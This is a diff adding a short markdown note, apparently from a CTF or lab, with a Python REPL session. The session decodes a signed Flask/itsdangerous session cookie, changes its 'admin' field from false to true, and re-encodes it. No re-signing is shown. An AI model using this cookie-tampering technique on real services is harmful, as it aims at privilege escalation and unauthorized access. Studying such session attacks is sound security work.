@@ -1,0 +1,27 @@
+#### Rough draft to encode cookie without secret key
+
+
+
+>>> from itsdangerous import base64_decode
+>>> x = '.eJwNj1FrgzAURv_KuM8-dEZhFfamZgo30hEXct-cdcRoMmhXqin978vjgcPh-x4wnN3sofgZ1uuUwHyGgh2PCfhfP05QPODlGwpATpa4ZiiXA8rakRK2k9XWlatD3jqdnjbitcHQWh36DFN8FdYsnTwx7fpMqHpF2WTk8E7RJjlmxJtcpP1dO1rRfjmywgj5adAuBx2Mi84ueBNbVY6q2iJvGPROZcWobHYs4w5Os5DtjKphnWqNDuM7PBO4XaeLH1w8AB83_zdd8jd4_gMnBU0s.DsGvxA.40D24QH1L2udlTJvkveK7mdVKYI'
+>>> x = x[1:]
+>>> x
+'eJwNj1FrgzAURv_KuM8-dEZhFfamZgo30hEXct-cdcRoMmhXqin978vjgcPh-x4wnN3sofgZ1uuUwHyGgh2PCfhfP05QPODlGwpATpa4ZiiXA8rakRK2k9XWlatD3jqdnjbitcHQWh36DFN8FdYsnTwx7fpMqHpF2WTk8E7RJjlmxJtcpP1dO1rRfjmywgj5adAuBx2Mi84ueBNbVY6q2iJvGPROZcWobHYs4w5Os5DtjKphnWqNDuM7PBO4XaeLH1w8AB83_zdd8jd4_gMnBU0s.DsGvxA.40D24QH1L2udlTJvkveK7mdVKYI'
+>>> y = x.split(".")[0]
+>>> data = base64_decode(y)
+>>> data
+'x\x9c\r\x8fQk\x830\x14F\xff\xca\xb8\xcf>tFa\x15\xf6\xa6f\n7\xd2\x11\x17r\xdf\x9cu\xc4h2hW\xaa)\xfd\xef\xcb\xe3\x81\xc3\xe1\xfb\x1e0\x9c\xdd\xec\xa1\xf8\x19\xd6\xeb\x94\xc0|\x86\x82\x1d\x8f\t\xf8_?NP<\xe0\xe5\x1b\n@N\x96\xb8f(\x97\x03\xca\xda\x91\x12\xb6\x93\xd5\xd6\x95\xabC\xde:\x9d\x9e6\xe2\xb5\xc1\xd0Z\x1d\xfa\x0cS|\x15\xd6,\x9d<1\xed\xfaL\xa8zE\xd9d\xe4\xf0N\xd1&9f\xc4\x9b\\\xa4\xfd];Z\xd1~9\xb2\xc2\x08\xf9i\xd0.\x07\x1d\x8c\x8b\xce.x\x13[U\x8e\xaa\xda"o\x18\xf4Ne\xc5\xa8lv,\xe3\x0eN\xb3\x90\xed\x8c\xaaa\x9dj\x8d\x0e\xe3;<\x13\xb8]\xa7\x8b\x1f\\<\x00\x1f7\xff7]\xf27x\xfe\x03\'\x05M,'
+>>> data = zlib.decompress(data)
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+NameError: name 'zlib' is not defined
+>>> import zlib
+>>> data = zlib.decompress(data)
+>>> data
+'{"admin":false,"id":399,"nonce":{" b":"MGZjZGY3MTk0MTFmZWNjOTExODlmMGJmY2QxZGFhMzJjYzU4M2M1NjhkOTQ3YmU4NWFlMTI4ZmMwZmY2ZTc4ZGI5N2UwYmZlMjVmZjNhNTRhMjk0YzhmZTcyNGI4M2E5MWExZTcxMzYyZDE3ZDIyMDFmZGZiNTJiMWI3OWJhYzc="},"username":"Hunter58"}'
+>>> from itsdangerous import base64_encode
+>>> datanew = '{"admin":true,"id":399,"nonce":{" b":"MGZjZGY3MTk0MTFmZWNjOTExODlmMGJmY2QxZGFhMzJjYzU4M2M1NjhkOTQ3YmU4NWFlMTI4ZmMwZmY2ZTc4ZGI5N2UwYmZlMjVmZjNhNTRhMjk0YzhmZTcyNGI4M2E5MWExZTcxMzYyZDE3ZDIyMDFmZGZiNTJiMWI3OWJhYzc="},"username":"Hunter58"}'
+>>> datanew = zlib.compress(datanew)
+>>> datanew = base64_encode(datanew)
+>>> datanew
+'eJwNj82KgzAURl9luGsXHX9gKsxOzUS4kQ5xJHfXWiFGk4KtVFP67pPlgcPh-15wvtrRQf5Y1iGC8Qp5cjxG4G6uHyB_wccFckBGhphKUE4HlJWlTphGlltTzBZZbVV82ohVGn1tlG9TjPFTGD018pQo26aiq2aUPCWLTwo2yT4lxjMRt09laUbzZ8kILeSvRjMdlNc2OLtgPLTKDLtyC7yhVzsVZUIF37EIOxiNQtYjdjxpulor33_DO4L1PizubMMB-FndY1iyL3j_A-FNTOE'
